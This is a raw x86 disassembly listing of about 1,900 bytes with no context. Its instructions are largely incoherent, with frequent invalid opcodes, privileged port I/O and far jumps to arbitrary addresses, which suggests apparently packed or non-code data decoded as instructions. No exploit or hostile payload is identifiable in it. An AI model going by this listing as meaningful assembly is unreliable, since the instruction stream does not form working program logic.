  41ef7a:	shl    DWORD PTR [ebx],1
  41ef7c:	ret    0xa46d
  41ef7f:	inc    esi
  41ef80:	fwait
  41ef81:	gs iret 
  41ef83:	cmp    BYTE PTR [esi],bh
  41ef85:	hlt    
  41ef86:	loope  0x41ef1f
  41ef88:	scas   al,BYTE PTR es:[edi]
  41ef89:	loope  0x41efaf
  41ef8b:	and    ch,bh
  41ef8d:	bound  ebx,QWORD PTR [ebp+0x63ba91c9]
  41ef93:	pop    eax
  41ef94:	mov    dl,0x6f
  41ef96:	xor    al,0xbf
  41ef98:	dec    esp
  41ef99:	mov    ds:0xe5151478,al
  41ef9e:	inc    ecx
  41ef9f:	repz pop es
  41efa1:	ja     0x41ef96
  41efa3:	jmp    0x84d312e2
  41efa8:	fwait
  41efa9:	repnz cli 
  41efab:	(bad)  
  41efac:	in     al,dx
  41efad:	mov    bh,0x13
  41efaf:	loopne 0x41effb
  41efb1:	xchg   ebp,eax
  41efb2:	call   0x11fb9e8e
  41efb7:	adc    al,0x9b
  41efb9:	jns    0x41f02d
  41efbb:	fst    QWORD PTR [ebp-0x25b5f019]
  41efc1:	jno    0x41ef98
  41efc3:	jp     0x41f015
  41efc5:	inc    edx
  41efc6:	jge    0x41ef67
  41efc8:	fwait
  41efc9:	das    
  41efca:	sub    BYTE PTR [ebx-0x14],dh
  41efcd:	and    DWORD PTR [ecx],ebp
  41efcf:	frstor [eax+0x1bbade17]
  41efd5:	aas    
  41efd6:	sar    DWORD PTR [ebx],cl
  41efd8:	adc    eax,0x9b27043e
  41efdd:	call   0x846cc1a9
  41efe2:	and    DWORD PTR [edx-0x6f],0x7a0763de
  41efe9:	ror    edx,cl
  41efeb:	outs   dx,DWORD PTR ds:[esi]
  41efec:	ja     0x41f02b
  41efee:	xchg   edi,eax
  41efef:	das    
  41eff0:	addr16 std 
  41eff2:	mov    ds:0x7f518bb7,eax
  41eff7:	outs   dx,BYTE PTR ds:[esi]
  41eff8:	inc    edx
  41eff9:	fidiv  WORD PTR [ecx+0x75e1089]
  41efff:	or     DWORD PTR [ecx-0x6e],edi
  41f002:	add    BYTE PTR ds:0x1bcc099d,ah
  41f008:	add    BYTE PTR [ebx-0x3460d5bd],ah
  41f00e:	push   ecx
  41f00f:	dec    ebx
  41f010:	call   0xf3c06d58
  41f015:	adc    BYTE PTR [eax+0x3a],ah
  41f018:	lea    esi,[ebp-0x70]
  41f01b:	pusha  
  41f01c:	sub    bh,BYTE PTR [ebp-0x23abcd5d]
  41f022:	push   cs
  41f023:	dec    edx
  41f024:	retf   
  41f025:	mov    eax,0xce4961f6
  41f02a:	pop    esi
  41f02b:	jbe    0x41efc8
  41f02d:	mov    cl,0xa
  41f02f:	sti    
  41f030:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f031:	pop    ds
  41f032:	push   ebp
  41f033:	in     al,dx
  41f034:	in     eax,dx
  41f035:	(bad)  
  41f037:	jle    0x41efbe
  41f039:	loopne 0x41efcb
  41f03b:	out    dx,eax
  41f03c:	xchg   esp,eax
  41f03d:	(bad)  
  41f03e:	xchg   ecx,eax
  41f03f:	push   0x2d45cd97
  41f044:	pop    ebx
  41f045:	jecxz  0x41f0af
  41f047:	nop
  41f048:	xchg   DWORD PTR [edi],esp
  41f04a:	das    
  41f04b:	dec    edx
  41f04c:	dec    edi
  41f04d:	ret    0x669c
  41f050:	ret    0xe58c
  41f053:	jg     0x41eff0
  41f055:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f056:	fcomp  QWORD PTR [edx*1+0x2bbe0b84]
  41f05d:	fidivr WORD PTR [edx+0x72]
  41f060:	jp     0x41f015
  41f062:	sub    al,0xd4
  41f064:	and    ebp,ebx
  41f066:	jae    0x41f06f
  41f068:	fwait
  41f069:	dec    ebx
  41f06a:	cld    
  41f06b:	scas   al,BYTE PTR es:[edi]
  41f06c:	add    eax,DWORD PTR [edx-0x19]
  41f06f:	outs   dx,BYTE PTR ds:[esi]
  41f070:	xor    al,0xde
  41f072:	xor    bl,BYTE PTR [ebp+esi*4+0x50]
  41f076:	pop    esi
  41f077:	aas    
  41f078:	push   0xffffff85
  41f07a:	nop
  41f07b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f07c:	adc    ebp,esi
  41f07e:	add    DWORD PTR [edi+edi*4],edi
  41f081:	je     0x41f0d0
  41f083:	dec    edx
  41f084:	icebp  
  41f085:	jbe    0x41f0c3
  41f087:	push   ebx
  41f088:	cmp    DWORD PTR [eax+0x199b0cc8],edx
  41f08e:	add    al,0xe
  41f090:	pop    ds
  41f091:	xchg   edi,eax
  41f092:	cwde   
  41f093:	push   eax
  41f094:	(bad)  
  41f095:	fisub  WORD PTR [edx-0x25478d02]
  41f09b:	ja     0x41f0c5
  41f09d:	leave  
  41f09e:	push   0x908b585b
  41f0a3:	pop    es
  41f0a4:	sub    al,BYTE PTR [ebx+0x6f]
  41f0a7:	mov    eax,ecx
  41f0a9:	iret   
  41f0aa:	(bad)  [ecx+0x75]
  41f0ad:	pop    ebx
  41f0ae:	leave  
  41f0af:	dec    esi
  41f0b0:	lahf   
  41f0b1:	mov    ch,0x35
  41f0b3:	fsubr  QWORD PTR [ebp-0x64451bbf]
  41f0b9:	enter  0x428d,0x72
  41f0bd:	push   es
  41f0be:	sub    al,0x4a
  41f0c0:	cmp    al,0x9e
  41f0c2:	xor    ch,BYTE PTR [eax+0xe]
  41f0c5:	jbe    0x41f0b9
  41f0c7:	ret    
  41f0c8:	fwait
  41f0c9:	or     edx,DWORD PTR [ecx-0x7b407994]
  41f0cf:	sbb    bl,dh
  41f0d1:	frstor [ebp-0x59]
  41f0d4:	(bad)  
  41f0d5:	loopne 0x41f138
  41f0d7:	jns    0x41f0e2
  41f0d9:	jns    0x41f088
  41f0db:	mov    edi,0xaf9e6dda
  41f0e0:	stc    
  41f0e1:	pop    ebp
  41f0e2:	cmp    edi,DWORD PTR [edx+edx*4+0x5e]
  41f0e6:	or     eax,0xe9dde62e
  41f0eb:	dec    eax
  41f0ec:	aad    0x9c
  41f0ee:	repnz sub DWORD PTR [edi+0x37a69063],edi
  41f0f5:	or     edx,DWORD PTR ds:0x2a95010
  41f0fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0fc:	jbe    0x41f132
  41f0fe:	nop
  41f0ff:	dec    esi
  41f100:	pop    ebp
  41f101:	push   ebp
  41f102:	loop   0x41f11c
  41f104:	pop    edx
  41f105:	les    edx,FWORD PTR [eax+0x1d7dcd40]
  41f10b:	ficomp WORD PTR [ebx]
  41f10d:	and    DWORD PTR [edi+0x4a],0xa11e4ad
  41f114:	pushf  
  41f115:	pop    esp
  41f116:	loop   0x41f0b7
  41f118:	fwait
  41f119:	stos   BYTE PTR es:[edi],al
  41f11a:	push   esi
  41f11b:	sub    al,0xf3
  41f11d:	jne    0x41f125
  41f11f:	dec    ecx
  41f120:	dec    edx
  41f121:	in     eax,0x1e
  41f123:	out    0xec,al
  41f125:	ss je  0x41f0b2
  41f128:	jae    0x41f199
  41f12a:	xchg   BYTE PTR [eax],al
  41f12c:	mov    ebp,DWORD PTR [ebp-0x34027770]
  41f132:	or     ecx,DWORD PTR [eax-0x2]
  41f135:	sbb    BYTE PTR [eax+0x4a],ah
  41f138:	xchg   edx,eax
  41f139:	loop   0x41f0ee
  41f13b:	mov    ss,WORD PTR [ebx+0x30]
  41f13e:	mov    al,ah
  41f140:	fwait
  41f141:	xrelease mov BYTE PTR [edx-0x2184b45f],dl
  41f148:	into   
  41f149:	(bad)  [edx+0x2a]
  41f14c:	adc    ebx,DWORD PTR [edx]
  41f14e:	aaa    
  41f14f:	aaa    
  41f150:	mov    bh,0x75
  41f152:	xchg   ebx,eax
  41f153:	push   eax
  41f154:	sub    ch,BYTE PTR [ebx+esi*1-0x7d99ab68]
  41f15b:	xor    eax,0xd79e0ae
  41f160:	ins    BYTE PTR es:[edi],dx
  41f161:	jnp    0x41f0e8
  41f163:	push   ss
  41f164:	arpl   WORD PTR [ecx+0x51],si
  41f167:	in     al,dx
  41f168:	lods   eax,DWORD PTR ds:[esi]
  41f169:	mov    BYTE PTR [eax],ch
  41f16b:	pop    ds
  41f16c:	lahf   
  41f16d:	out    0xe2,eax
  41f16f:	retf   
  41f170:	dec    edx
  41f171:	sahf   
  41f172:	adc    BYTE PTR [ebx],dl
  41f174:	loope  0x41f176
  41f176:	add    dh,BYTE PTR [ebp-0xd]
  41f179:	xchg   ecx,eax
  41f17a:	jmp    0xfeb41c04
  41f17f:	xchg   esi,eax
  41f180:	xchg   edx,eax
  41f181:	fiadd  WORD PTR [eax]
  41f183:	xchg   ecx,eax
  41f184:	sbb    bh,BYTE PTR [ecx+0x74]
  41f187:	mov    bl,0xff
  41f189:	fstp   QWORD PTR ds:0x75c74f7f
  41f18f:	cmp    DWORD PTR [esi+0x56289009],ebx
  41f195:	lea    ecx,[edi+ebx*2+0x44]
  41f199:	sti    
  41f19a:	pushf  
  41f19b:	dec    ecx
  41f19c:	sub    esp,ebx
  41f19e:	add    edi,esp
  41f1a0:	mov    ch,0x3a
  41f1a2:	or     ebp,ebp
  41f1a4:	mov    ah,0xc
  41f1a6:	sbb    dl,BYTE PTR [ebx]
  41f1a8:	outs   dx,DWORD PTR ds:[esi]
  41f1a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1aa:	ror    ah,0x24
  41f1ad:	fidiv  WORD PTR [edi-0x70]
  41f1b0:	dec    ecx
  41f1b1:	push   esp
  41f1b2:	cmp    eax,0xafd97e75
  41f1b7:	stc    
  41f1b8:	sbb    eax,0x1a5e8ff6
  41f1bd:	jl     0x41f1f3
  41f1bf:	dec    ebx
  41f1c0:	dec    esp
  41f1c1:	ficom  WORD PTR [ebx+0x33854a1]
  41f1c7:	push   esi
  41f1c8:	gs das 
  41f1ca:	int3   
  41f1cb:	aas    
  41f1cc:	push   eax
  41f1cd:	pop    esi
  41f1ce:	xor    ch,cl
  41f1d0:	leave  
  41f1d1:	add    ah,BYTE PTR [ecx+0x17]
  41f1d4:	clc    
  41f1d5:	fstp   QWORD PTR [ebx+0x5f]
  41f1d8:	call   0xb808:0x79d0a6d1
  41f1df:	cmp    eax,0x9390903c
  41f1e4:	jmp    0x41f249
  41f1e6:	cli    
  41f1e7:	mov    ebp,0x4a4dc8e7
  41f1ec:	retf   
  41f1ed:	ror    BYTE PTR [ecx+0x38],cl
  41f1f0:	inc    edx
  41f1f1:	lock sti 
  41f1f3:	outs   dx,DWORD PTR ds:[esi]
  41f1f4:	fwait
  41f1f5:	mov    eax,0x42ac52b0
  41f1fa:	ret    
  41f1fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1fc:	push   ss
  41f1fd:	fimul  WORD PTR [edi-0x40]
  41f200:	cmp    al,0xa3
  41f202:	sti    
  41f203:	popf   
  41f204:	sbb    edi,ebp
  41f206:	(bad)
  41f20a:	adc    edx,DWORD PTR ds:0x49dbcbc9
  41f210:	or     ch,ah
  41f212:	mov    edi,0x609414e8
  41f217:	xchg   BYTE PTR [ebx-0x43199ced],bl
  41f21d:	popf   
  41f21e:	aas    
  41f21f:	mov    eax,0x4ac7de5c
  41f224:	daa    
  41f225:	pop    ebx
  41f226:	add    eax,0xb2aec2f
  41f22b:	pop    edi
  41f22c:	fwait
  41f22d:	fwait
  41f22e:	xor    BYTE PTR [edx+0x37],dl
  41f231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f232:	shl    DWORD PTR [ecx-0x13],0xdd
  41f236:	sub    eax,0x873a3f43
  41f23b:	mov    esi,0x6c8fe1c7
  41f240:	sbb    dl,BYTE PTR [ecx]
  41f242:	or     esi,DWORD PTR [ebp+0x4a15533b]
  41f248:	inc    ebx
  41f249:	test   BYTE PTR [ebx],bl
  41f24b:	mov    dl,0x14
  41f24d:	int    0x68
  41f24f:	or     eax,0x3546809b
  41f254:	mov    esi,0x35d490
  41f259:	les    ebx,FWORD PTR [edx+0x4a]
  41f25c:	or     edx,DWORD PTR ds:0xcec85df
  41f262:	mov    esp,0x91f3daa7
  41f267:	leave  
  41f268:	add    eax,0xa116dd3d
  41f26d:	ds push esi
  41f26f:	dec    edx
  41f270:	pop    ebx
  41f271:	dec    edi
  41f272:	mov    al,ds:0x2b1e030
  41f277:	add    edx,edi
  41f279:	mov    bh,0x9d
  41f27b:	out    0x12,eax
  41f27d:	mov    esp,0x21408bd0
  41f282:	inc    edi
  41f283:	std    
  41f284:	push   es
  41f285:	fiadd  WORD PTR [eax-0x1d691afc]
  41f28b:	sub    DWORD PTR [ebx],esp
  41f28d:	rcl    DWORD PTR [eax-0x3ead99c4],0x2a
  41f294:	mov    edx,0x3149d593
  41f299:	jp     0x41f28e
  41f29b:	dec    esp
  41f29c:	and    BYTE PTR [edx],al
  41f29e:	fisubr WORD PTR [ebx+ebx*4]
  41f2a1:	push   esp
  41f2a2:	in     al,dx
  41f2a3:	in     al,dx
  41f2a4:	pop    ebp
  41f2a5:	mov    WORD PTR [edx],cs
  41f2a7:	push   cs
  41f2a8:	ret    
  41f2a9:	loopne 0x41f294
  41f2ab:	jo     0x41f2a7
  41f2ad:	ror    DWORD PTR ds:0xb17fb762,0x6b
  41f2b4:	pop    ebx
  41f2b5:	dec    BYTE PTR [eax+0x25]
  41f2b8:	loop   0x41f2ed
  41f2ba:	bound  ecx,QWORD PTR [ecx+edx*4-0x6f]
  41f2be:	lods   al,BYTE PTR ds:[esi]
  41f2bf:	mov    esp,0x6a5179e7
  41f2c4:	shl    BYTE PTR [ecx-0x6a64c8e2],0x8b
  41f2cb:	ins    BYTE PTR es:[edi],dx
  41f2cc:	and    al,0x5b
  41f2ce:	in     eax,0x5d
  41f2d0:	inc    eax
  41f2d1:	mul    BYTE PTR ds:0xfb23cdbc
  41f2d7:	fs fwait
  41f2d9:	std    
  41f2da:	mov    bh,0x88
  41f2dc:	lea    edi,ds:0xe17574b4
  41f2e2:	add    ecx,DWORD PTR [ebx]
  41f2e4:	mov    ch,BYTE PTR [edi-0x41]
  41f2e7:	call   0xd9b:0xb2df8333
  41f2ee:	adc    cl,BYTE PTR gs:[ebx+esi*1+0x6a]
  41f2f3:	shl    cl,cl
  41f2f5:	sti    
  41f2f6:	or     al,0x60
  41f2f8:	mov    ds:0x891720e0,al
  41f2fd:	icebp  
  41f2fe:	es cli 
  41f300:	ja     0x41f326
  41f302:	gs pop esp
  41f304:	fwait
  41f305:	repnz hlt 
  41f307:	dec    edi
  41f308:	into   
  41f309:	and    BYTE PTR [esi],dh
  41f30b:	add    dh,BYTE PTR [edx+0x55ba46dd]
  41f311:	repnz or eax,DWORD PTR [eax]
  41f314:	adc    dh,BYTE PTR [eax+edx*4+0x371e839d]
  41f31b:	mov    esi,0x505a3547
  41f320:	out    dx,al
  41f321:	sti    
  41f322:	imul   ecx,DWORD PTR [ecx],0xfffffffa
  41f325:	pop    ss
  41f326:	nop
  41f327:	or     edx,DWORD PTR [esi]
  41f329:	iret   
  41f32a:	pop    ss
  41f32b:	push   esp
  41f32c:	dec    eax
  41f32d:	xlat   BYTE PTR ds:[ebx]
  41f32e:	outs   dx,DWORD PTR ds:[esi]
  41f32f:	dec    edx
  41f330:	mov    eax,0x3dbede45
  41f335:	loope  0x41f2bc
  41f337:	inc    ebp
  41f338:	sahf   
  41f339:	push   es
  41f33a:	push   es
  41f33b:	mov    al,ds:0xd9c5c4c8
  41f340:	loop   0x41f390
  41f342:	xor    al,0x4a
  41f344:	mov    WORD PTR [eax+0x3e7108cd],?
  41f34a:	pop    ecx
  41f34b:	dec    edi
  41f34c:	fwait
  41f34d:	cmp    al,ch
  41f34f:	loopne 0x41f3cf
  41f351:	pusha  
  41f352:	sbb    DWORD PTR [ecx+edi*2-0x22],esi
  41f356:	mov    eax,0xc67c481e
  41f35b:	push   ebx
  41f35c:	dec    ebx
  41f35d:	jmp    0x41f2ef
  41f35f:	push   ss
  41f360:	fucom  st(3)
  41f362:	push   es
  41f363:	leave  
  41f364:	xor    ebp,DWORD PTR [ebp-0x22206290]
  41f36a:	std    
  41f36b:	lods   al,BYTE PTR ds:[esi]
  41f36c:	and    esp,edx
  41f36e:	or     ebp,ecx
  41f370:	add    al,0x59
  41f372:	je     0x41f350
  41f374:	fwait
  41f375:	icebp  
  41f376:	stmxcsr DWORD PTR [edi+0x5a14a762]
  41f37d:	fisubr WORD PTR [ebx+0x2957565a]
  41f383:	fidiv  DWORD PTR [edx]
  41f385:	inc    ecx
  41f386:	nop
  41f387:	inc    ebx
  41f388:	inc    ebx
  41f389:	adc    bh,BYTE PTR gs:[eax-0x3b]
  41f38d:	dec    ebx
  41f38e:	test   DWORD PTR [edx-0xe],ecx
  41f391:	pop    ebx
  41f392:	mov    edi,ecx
  41f394:	mov    dh,0x99
  41f396:	dec    edx
  41f397:	out    0x9b,eax
  41f399:	jnp    0x41f40a
  41f39b:	mov    cl,ah
  41f39d:	adc    ah,BYTE PTR [edx]
  41f39f:	dec    eax
  41f3a0:	xchg   edi,eax
  41f3a1:	fisub  WORD PTR [ecx+eax*1]
  41f3a4:	push   ecx
  41f3a5:	mov    esp,0x596184c9
  41f3aa:	nop
  41f3ab:	fsub   QWORD PTR [eax]
  41f3ad:	ror    BYTE PTR [edi+0x1d],cl
  41f3b0:	jmp    0x41f333
  41f3b2:	push   esp
  41f3b3:	dec    edx
  41f3b4:	out    0x51,al
  41f3b6:	loope  0x41f3a9
  41f3b8:	or     al,BYTE PTR ds:[edi]
  41f3bb:	adc    bh,BYTE PTR es:[esi-0x70]
  41f3bf:	xor    eax,0xa6dcbfc0
  41f3c4:	lahf   
  41f3c5:	cmp    BYTE PTR [edx],ch
  41f3c7:	dec    edx
  41f3c8:	add    eax,0xaecbfc75
  41f3cd:	add    al,0x23
  41f3cf:	(bad)  
  41f3d0:	fwait
  41f3d1:	cld    
  41f3d2:	mov    esp,0x9d776ca2
  41f3d7:	sti    
  41f3d8:	popa   
  41f3d9:	sti    
  41f3da:	cmp    DWORD PTR [eax-0x559e21ab],edx
  41f3e0:	adc    BYTE PTR [ecx-0x60],bh
  41f3e3:	cmc    
  41f3e4:	pushf  
  41f3e5:	arpl   WORD PTR [ebp+ebx*2+0x3c],bp
  41f3e9:	(bad)  
  41f3ea:	jns    0x41f3e3
  41f3ec:	fld    TBYTE PTR [edi-0x21ccb3a2]
  41f3f2:	stos   BYTE PTR es:[edi],al
  41f3f3:	add    DWORD PTR [ebx],eax
  41f3f5:	leave  
  41f3f6:	jne    0x41f430
  41f3f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3f9:	mov    ah,cl
  41f3fb:	inc    esi
  41f3fc:	add    BYTE PTR [esi+0x51],bl
  41f3ff:	sbb    DWORD PTR [ebx+0x52],ebp
  41f402:	sbb    bh,cl
  41f404:	xchg   edi,eax
  41f405:	push   ebp
  41f406:	push   0x72
  41f408:	mov    ch,0x74
  41f40a:	cmp    cl,BYTE PTR [edx+0x6]
  41f40d:	bound  ebp,QWORD PTR fs:[ecx+0x6e3196ce]
  41f414:	push   ss
  41f415:	inc    esi
  41f416:	xchg   ebx,eax
  41f417:	daa    
  41f418:	xlat   BYTE PTR ds:[ebx]
  41f419:	les    esp,FWORD PTR [ebx+0x46]
  41f41c:	fdiv   DWORD PTR [eax-0x48b3ee0c]
  41f422:	cmp    eax,0xc4d10551
  41f427:	popf   
  41f428:	mov    dl,0xdd
  41f42a:	mov    ecx,0x9348b13f
  41f42f:	jno    0x41f3e7
  41f431:	(bad)  
  41f432:	ds pop ebx
  41f434:	adc    eax,0xbb0773be
  41f439:	frstor [ebx]
  41f43b:	mov    eax,ds:0x5cee2a3e
  41f440:	out    dx,al
  41f441:	adc    edx,DWORD PTR [eax-0x4018c306]
  41f447:	idiv   dh
  41f449:	jmp    0x114e:0xa72c4a87
  41f450:	es dec esi
  41f452:	loope  0x41f3e5
  41f454:	pushf  
  41f455:	sti    
  41f456:	mov    eax,ds:0x6dd54137
  41f45b:	loope  0x41f418
  41f45d:	push   ebx
  41f45e:	cmovp  ebx,DWORD PTR [ebx]
  41f461:	inc    eax
  41f462:	inc    esp
  41f463:	dec    eax
  41f464:	push   ss
  41f465:	xchg   edx,edx
  41f467:	push   ds
  41f468:	fwait
  41f469:	adc    edi,edx
  41f46b:	(bad)  
  41f46c:	hlt    
  41f46d:	push   ebp
  41f46e:	cmp    al,0xdd
  41f470:	xchg   esi,eax
  41f471:	faddp  st(0),st
  41f473:	stc    
  41f474:	loope  0x41f4bf
  41f476:	mov    ds:0x9073f130,eax
  41f47b:	mov    eax,ds:0x825ed21f
  41f480:	test   ch,dl
  41f482:	fisttp WORD PTR [ecx-0x68]
  41f485:	xchg   esp,eax
  41f486:	(bad)  
  41f487:	sahf   
  41f488:	add    DWORD PTR [edx-0x60],esi
  41f48b:	pop    esp
  41f48c:	fwait
  41f48d:	mov    al,ds:0xe2f66b69
  41f492:	sti    
  41f493:	mov    BYTE PTR [esi+0x1556ece5],cl
  41f499:	rcl    DWORD PTR [edi-0x66],cl
  41f49c:	adc    dl,dh
  41f49e:	icebp  
  41f49f:	add    DWORD PTR [ebx-0x2a9b8a12],ebx
  41f4a5:	push   ecx
  41f4a6:	int    0x58
  41f4a8:	jae    0x41f48b
  41f4aa:	sub    DWORD PTR [esi+0x6c],edx
  41f4ad:	jmp    0x898dcf56
  41f4b2:	fldcw  WORD PTR [esi]
  41f4b4:	fwait
  41f4b5:	(bad)  
  41f4b6:	sbb    DWORD PTR [ebp-0x6f8ec840],0x8130df15
  41f4c0:	hlt    
  41f4c1:	adc    bh,0x26
  41f4c4:	xor    eax,0xd8b9701c
  41f4c9:	and    eax,0xb89b1dac
  41f4ce:	iret   
  41f4cf:	xchg   DWORD PTR [edx-0x64631eed],ebx
  41f4d5:	fidiv  WORD PTR [esp+ebx*1-0x13]
  41f4d9:	out    dx,eax
  41f4da:	xchg   ch,bl
  41f4dc:	sub    cl,BYTE PTR [esi+0x676e49d2]
  41f4e2:	push   0xc0c7e005
  41f4e7:	stc    
  41f4e8:	fwait
  41f4e9:	ror    DWORD PTR [eax],cl
  41f4eb:	jbe    0x41f54f
  41f4ed:	push   0xde9674c3
  41f4f2:	add    al,0xc3
  41f4f4:	aas    
  41f4f5:	mov    BYTE PTR [edi+0x58],ah
  41f4f8:	jns    0x41f552
  41f4fa:	nop
  41f4fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4fc:	or     ch,BYTE PTR [ebx]
  41f4fe:	xor    BYTE PTR [edi+0x7b],dl
  41f501:	fiadd  DWORD PTR [ebx]
  41f503:	dec    edx
  41f504:	(bad)  ds:0x25c65211
  41f50a:	jmp    0x909b703b
  41f50f:	jmp    0x41f567
  41f511:	mov    ebx,0xbc40582f
  41f516:	fisub  WORD PTR [esi+0x6e]
  41f519:	lahf   
  41f51a:	je     0x41f542
  41f51c:	lahf   
  41f51d:	cmp    DWORD PTR [eax],ebp
  41f51f:	outs   dx,BYTE PTR ds:[esi]
  41f520:	dec    eax
  41f521:	ficomp WORD PTR [ebx-0x5e]
  41f524:	out    0x50,eax
  41f526:	test   edi,esi
  41f528:	fwait
  41f529:	(bad)  
  41f52a:	sbb    eax,0x44846b46
  41f52f:	je     0x41f530
  41f531:	adc    eax,0x8b9b0be6
  41f536:	jmp    0x2a886745
  41f53b:	cs fwait
  41f53d:	lds    eax,FWORD PTR [edi]
  41f53f:	cli    
  41f540:	out    0xa0,al
  41f542:	xchg   esi,eax
  41f543:	into   
  41f544:	mov    ebp,0x485b9f57
  41f549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f54a:	sub    DWORD PTR [eax-0x18],ebx
  41f54d:	enter  0x6c90,0xc1
  41f551:	repz call 0xfa99:0xbd649b4a
  41f559:	jae    0x41f4e2
  41f55b:	mov    esp,ebx
  41f55d:	fisub  WORD PTR [edi]
  41f55f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f560:	xchg   ebp,eax
  41f561:	cld    
  41f562:	xchg   ecx,eax
  41f563:	(bad)
  41f566:	push   ss
  41f567:	jge    0x41f504
  41f569:	mov    cl,0x18
  41f56b:	pusha  
  41f56c:	xor    dl,dh
  41f56e:	sub    bh,BYTE PTR [ebx+0x9]
  41f571:	ficom  WORD PTR [ebx-0x11]
  41f574:	mov    ah,0x9a
  41f576:	adc    DWORD PTR ds:0x26903b36,ebx
  41f57c:	out    0xbf,al
  41f57e:	sar    BYTE PTR [edi+0x5d],1
  41f581:	mov    esi,0xab1e49fe
  41f586:	sbb    eax,0xb54fa522
  41f58b:	pushf  
  41f58c:	jecxz  0x41f602
  41f58e:	pop    es
  41f58f:	leave  
  41f590:	fcmovnbe st,st(6)
  41f593:	stc    
  41f594:	jmp    0x29dd:0xa6129f83
  41f59b:	mov    WORD PTR [edi+0x5f],ss
  41f59e:	push   0x7f
  41f5a0:	inc    ebp
  41f5a1:	(bad)  
  41f5a2:	xchg   ecx,eax
  41f5a3:	test   al,0xa8
  41f5a5:	adc    eax,0x9dcad9be
  41f5aa:	mov    BYTE PTR [eax+0xa5ddf7],al
  41f5b0:	pop    esp
  41f5b1:	(bad)  
  41f5b2:	mov    esp,0xc99be07e
  41f5b7:	out    dx,eax
  41f5b8:	(bad)  
  41f5b9:	(bad)  [edi-0x4d]
  41f5bc:	mov    WORD PTR [edx+0x5b],es
  41f5bf:	push   es
  41f5c0:	sbb    esi,ebx
  41f5c2:	mov    al,ds:0x29088262
  41f5c7:	add    BYTE PTR [ebp+0x2a959f7a],al
  41f5cd:	fs stos BYTE PTR es:[edi],al
  41f5cf:	or     BYTE PTR [eax-0x6120128f],bh
  41f5d5:	pop    esp
  41f5d6:	sar    DWORD PTR [eax-0x4e],1
  41f5d9:	aad    0x4c
  41f5db:	push   ebx
  41f5dc:	adc    al,0xe5
  41f5de:	adc    DWORD PTR [edi],esi
  41f5e0:	(bad)  
  41f5e1:	push   ecx
  41f5e2:	ja     0x41f62f
  41f5e4:	jmp    0x41f61e
  41f5e6:	lds    ecx,FWORD PTR ds:0xe29001ab
  41f5ec:	or     ch,ah
  41f5ee:	mov    esp,0x6c7c44c5
  41f5f3:	dec    edx
  41f5f4:	leave  
  41f5f5:	xor    BYTE PTR [ecx-0x7c45f12],al
  41f5fb:	mov    ecx,0x626f89aa
  41f600:	mov    ds:0xb4273ddd,al
  41f605:	popa   
  41f606:	push   0x4b
  41f608:	add    al,0x2b
  41f60a:	mov    cl,0x5d
  41f60c:	adc    eax,0x741275d1
  41f611:	xchg   esi,eax
  41f612:	nop
  41f613:	fs (bad) 
  41f615:	out    dx,eax
  41f616:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f617:	pop    edx
  41f618:	push   edi
  41f619:	leave  
  41f61a:	adc    esp,DWORD PTR [eax-0x34]
  41f61d:	pop    ecx
  41f61e:	bound  ebx,QWORD PTR [ebp+0x68]
  41f621:	fdivp  st(6),st
  41f623:	jbe    0x41f682
  41f625:	popf   
  41f626:	mov    eax,DWORD PTR [edx-0x62]
  41f629:	fild   WORD PTR [ecx-0x24]
  41f62c:	sbb    ch,BYTE PTR [esi+0x74]
  41f62f:	sub    ah,BYTE PTR [ebx]
  41f631:	bound  edx,QWORD PTR [ebx+0x4a]
  41f634:	mov    dl,BYTE PTR [ecx+0x19]
  41f637:	adc    eax,0xf2fc39bc
  41f63c:	push   cs
  41f63d:	loop   0x41f5ce
  41f63f:	(bad)  
  41f641:	dec    edx
  41f642:	add    al,0xd6
  41f644:	imul   edi,DWORD PTR [esi+ebp*4+0x50769949],0xfde6c035
  41f64f:	add    bl,BYTE PTR [ebx-0x4f72c509]
  41f655:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f656:	jo     0x41f628
  41f658:	int    0xdd
  41f65a:	js     0x41f6a2
  41f65c:	inc    ebp
  41f65d:	cli    
  41f65e:	aad    0xc6
  41f660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f661:	and    eax,0x469a2590
  41f666:	pop    ss
  41f667:	adc    eax,0x86a72853
  41f66c:	out    0xbc,al
  41f66e:	nop
  41f66f:	and    al,0x23
  41f672:	jle    0x41f6b7
  41f674:	sbb    bh,al
  41f676:	(bad)  
  41f677:	int    0x71
  41f679:	out    0xef,al
  41f67b:	jb     0x41f6d0
  41f67d:	fsubr  DWORD PTR [ebp+0x51]
  41f680:	pop    edi
  41f681:	mov    al,0x36
  41f683:	sub    al,0xe0
  41f685:	mov    al,0x29
  41f687:	sahf   
  41f688:	fwait
  41f689:	and    DWORD PTR [eax+ebp*2],ebx
  41f68c:	adc    DWORD PTR [eax],0x46
  41f68f:	mov    al,ds:0xdf50de6b
  41f694:	retf   0x8b8d
  41f697:	js     0x41f66a
  41f699:	mov    BYTE PTR fs:[eax-0x3f],dh
  41f69d:	(bad)  
  41f69f:	das    
  41f6a0:	mov    ds:0xeb05fbff,al
  41f6a5:	cli    
  41f6a6:	push   edi
  41f6a7:	bound  ecx,QWORD PTR [esi+ebx*8+0x15]
  41f6ab:	stos   DWORD PTR es:[edi],eax
  41f6ac:	imul   ebx,edx,0x43
  41f6af:	imul   ebp,DWORD PTR ds:0x9c41af20,0xa65a1131
  41f6b9:	mov    eax,ds:0x3e6deb2e
  41f6be:	dec    edx
  41f6bf:	cli    
  41f6c0:	aaa    
  41f6c1:	fisub  WORD PTR [eax+edx*4-0x16081479]
  41f6c8:	xchg   ecx,eax
  41f6c9:	lods   eax,DWORD PTR ds:[esi]
  41f6ca:	add    ecx,esp
  41f6cc:	fwait
  41f6cd:	mov    eax,ds:0xa0bb40e3
  41f6d2:	cmc    
